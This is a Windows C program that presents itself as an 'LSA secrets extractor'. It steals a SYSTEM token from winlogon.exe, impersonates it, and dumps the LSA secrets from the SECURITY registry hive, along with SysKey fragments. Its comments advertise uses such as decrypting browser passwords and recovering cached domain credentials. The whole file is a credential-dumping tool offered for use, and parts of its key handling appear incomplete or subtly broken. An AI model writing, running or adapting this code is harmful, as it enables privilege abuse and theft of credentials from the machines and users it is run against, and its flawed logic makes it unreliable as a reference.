#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

DWORD FindWinlogonPID() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (strcmp(pe.szExeFile, "winlogon.exe") == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return 0;
}

HANDLE StealSystemToken() {
    DWORD pid = FindWinlogonPID();
    if (!pid) return NULL;
    
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) return NULL;
    
    HANDLE hToken, hNewToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return NULL;
    }
    
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return NULL;
    }
    
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return hNewToken;
}

void AnalyzeAndPrintSecret(const char* name, const BYTE* data, DWORD size) {
    printf("\n[SECRET] %s\n", name);
    printf("----------------------------------------\n");
    
    if (strcmp(name, "DPAPI_SYSTEM") == 0) {
        printf("TYPE: DPAPI Master Keys\n");
        if (size >= 44) {
            printf("Machine GUID: ");
            for (DWORD i = 0; i < 16 && i < size; i++) printf("%02X", data[i + 8]);
            printf("\n");
            
            printf("User Key: ");
            for (DWORD i = 0; i < 20 && i < size - 28; i++) printf("%02X", data[i + 28]);
            printf("\n");
        }
        printf("USAGE: Decrypt browser passwords, WiFi keys, certificates\n");
        
    } else if (strcmp(name, "NL$KM") == 0) {
        printf("TYPE: Cached Domain Keys\n");
        if (size >= 16) {
            printf("Key Material: ");
            for (DWORD i = 0; i < 16 && i < size; i++) printf("%02X", data[i + 8]);
            printf("\n");
        }
        printf("USAGE: Recover cached domain credentials\n");
        
    } else {
        printf("TYPE: Generic LSA Secret\n");
        printf("Data Preview: ");
        for (DWORD i = 0; i < (size > 32 ? 32 : size); i++) {
            printf("%02X", data[i]);
        }
        if (size > 32) printf("...");
        printf("\n");
    }
    
    printf("Size: %lu bytes\n", size);
}

void DumpAllSecrets() {
    HANDLE hToken = StealSystemToken();
    if (!hToken) {
        printf("ERROR: Cannot get SYSTEM token\n");
        return;
    }
    
    ImpersonateLoggedOnUser(hToken);
    
    HKEY hSecrets, hCurrVal;
    DWORD index = 0;
    char secretName[256];
    DWORD nameSize = sizeof(secretName);
    
    printf("LSA SECRETS DUMP - COMPLETE\n");
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\Secrets", 0, KEY_READ, &hSecrets) != ERROR_SUCCESS) {
        printf("ERROR: Cannot access LSA Secrets\n");
        RevertToSelf();
        CloseHandle(hToken);
        return;
    }
    
    while (RegEnumKeyExA(hSecrets, index, secretName, &nameSize, NULL, NULL, NULL, NULL) != ERROR_NO_MORE_ITEMS) {
        char currValPath[512];
        snprintf(currValPath, sizeof(currValPath), "SECURITY\\Policy\\Secrets\\%s\\CurrVal", secretName);
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, currValPath, 0, KEY_READ, &hCurrVal) == ERROR_SUCCESS) {
            BYTE data[8192];
            DWORD size = sizeof(data);
            
            if (RegQueryValueExA(hCurrVal, "", NULL, NULL, data, &size) == ERROR_SUCCESS) {
                AnalyzeAndPrintSecret(secretName, data, size);
            }
            RegCloseKey(hCurrVal);
        }
        
        index++;
        nameSize = sizeof(secretName);
    }
    
    RegCloseKey(hSecrets);
    RevertToSelf();
    CloseHandle(hToken);
}

void ExtractSysKey() {
    printf("\nSYSTEM KEYS:\n");
    
    HKEY hKey;
    BYTE keyData[32];
    DWORD size = sizeof(keyData);
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "", NULL, NULL, keyData, &size) == ERROR_SUCCESS) {
            printf("JD Key: ");
            for (DWORD i = 0; i < size; i++) printf("%02X", keyData[i]);
            printf("\n");
        }
        RegCloseKey(hKey);
    }
    size = sizeof(keyData);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "", NULL, NULL, keyData, &size) == ERROR_SUCCESS) {
            printf("Skew1 Key: ");
            for (DWORD i = 0; i < size; i++) printf("%02X", keyData[i]);
            printf("\n");
        }
        RegCloseKey(hKey);
    }
}

int main() {
    printf("LSA SECRETS EXTRACTOR\n");
    
    ExtractSysKey();
    DumpAllSecrets();
    
    printf("\nEXTRACTION COMPLETE!\n");

    getchar();
    
    return 0;
}
